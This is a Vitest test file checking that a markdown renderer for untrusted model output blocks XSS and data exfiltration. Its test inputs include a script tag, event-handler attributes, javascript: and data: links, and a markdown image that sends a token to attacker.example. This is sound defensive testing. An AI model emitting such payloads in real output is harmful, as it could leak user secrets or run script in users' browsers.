import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

function html(source: string): string {
  const div = document.createElement("div");
  div.append(renderMarkdown(source));
  return div.innerHTML;
}

function dom(source: string): HTMLDivElement {
  const div = document.createElement("div");
  div.append(renderMarkdown(source));
  return div;
}

describe("renderMarkdown — untrusted model output (§24.2)", () => {
  it("escapes raw HTML instead of parsing it", () => {
    const out = html('hello <script>alert(1)</script> world');
    expect(out).not.toContain("<script");
    expect(out).toContain("&lt;script&gt;");
  });

  it("never produces a live element with an event-handler attribute", () => {
    const root = dom('<div onclick="steal()">x</div>\n\n**ok** <span onmouseover="x()">y</span>');
    for (const el of root.querySelectorAll("*")) {
      for (const attr of el.getAttributeNames()) {
        expect(attr.startsWith("on")).toBe(false);
      }
    }
  });

  it("does not render image syntax (exfiltration vector)", () => {
    const out = html("![secret](http://attacker.example/?d=token)");
    expect(out).not.toContain("<img");
    expect(out).toContain("attacker.example");
  });

  it("never emits an anchor with a javascript: or data: href", () => {
    const root = dom(
      "[click](javascript:alert(1)) and [x](data:text/html,hi) and [ok](https://ok.example)",
    );
    for (const a of root.querySelectorAll("a")) {
      const href = a.getAttribute("href") ?? "";
      expect(/^(javascript|data):/i.test(href)).toBe(false);
    }
  });

  it("forces rel/target on safe links", () => {
    const out = html("[docs](https://example.com)");
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('href="https://example.com"');
  });

  it("keeps ordinary formatting", () => {
    const out = html("**bold** and `code` and\n\n- a\n- b");
    expect(out).toContain("<strong>bold</strong>");
    expect(out).toContain("<code>code</code>");
    expect(out).toContain("<li>a</li>");
  });

  it("turns [[n]] into citation chips", () => {
    const out = html("The sky is blue [[1]] and grass is green [[2]].");
    expect(out).toContain('<sup class="cite" data-cite="1">1</sup>');
    expect(out).toContain('data-cite="2"');
  });
});
